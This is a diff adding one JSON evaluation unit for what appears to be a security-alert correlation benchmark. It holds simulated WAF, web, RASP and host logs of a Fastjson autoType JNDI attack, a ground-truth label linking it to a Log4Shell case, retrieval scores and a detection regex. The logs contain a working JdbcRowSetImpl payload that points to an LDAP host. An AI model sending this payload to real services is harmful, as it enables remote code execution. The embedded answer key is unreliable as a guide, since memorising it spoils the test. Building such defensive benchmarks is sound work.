@@ -1,0 +1,136 @@
+{
+ "unit": 1007,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-001",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "JNDI 家族（Fastjson autoType），注入载体与 CASE-001 的 ${jndi: 不同"
+ },
+ "technique": "Fastjson autoType（JdbcRowSetImpl JNDI，JSON body）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-16 01:14:43",
+   "source": "waf",
+   "log_id": "WAF0304198",
+   "content": "/api/user/profile {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://10.20.7.31\"} Mozilla/5.0 (iPhone; CPU",
+   "event_id": "1007-WAF0304198"
+  },
+  {
+   "timestamp": "2026-06-16 01:14:44",
+   "source": "web",
+   "log_id": "WEB0306177",
+   "content": "/api/user/profile {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://10.20.7.31\"} Mozilla/5.0 (iPhone; CPU",
+   "event_id": "1007-WEB0306177"
+  },
+  {
+   "timestamp": "2026-06-16 01:14:45",
+   "source": "rasp",
+   "log_id": "RASP0336559",
+   "content": "https://app-java-119.ops-corp.com/api/user/profile {\"autoType\": \"JdbcRowSetImpl\"} Mozilla/5.0 (iPhone; CPU iPh",
+   "event_id": "1007-RASP0336559"
+  },
+  {
+   "timestamp": "2026-06-16 01:16:10",
+   "source": "hids",
+   "log_id": "HID0329665",
+   "content": "touch /tmp/.x <== /bin/sh -c 'touch /tmp/.x' <== /usr/bin/java -jar /opt/app/user-api.jar",
+   "event_id": "1007-HID0329665"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 1,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S3",
+     "action_id": "log4shell_java_child_cmd",
+     "label": "java 进程派生子 shell 执行命令",
+     "event_ids": [
+      "1007-HID0329665"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "generic": true
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 4,
+   "keyword_details": [
+    "probe +4: java(?:\\.exe)?\\s+-jar\\s+/opt/app/"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2"
+   ],
+   "before_steps": [
+    "S1",
+    "S2"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S3",
+    "label": "java 进程派生子 shell 执行命令",
+    "sources": [
+     "hids"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1007-HID0329665"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 4,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1105"
+  ]
+ }
+}
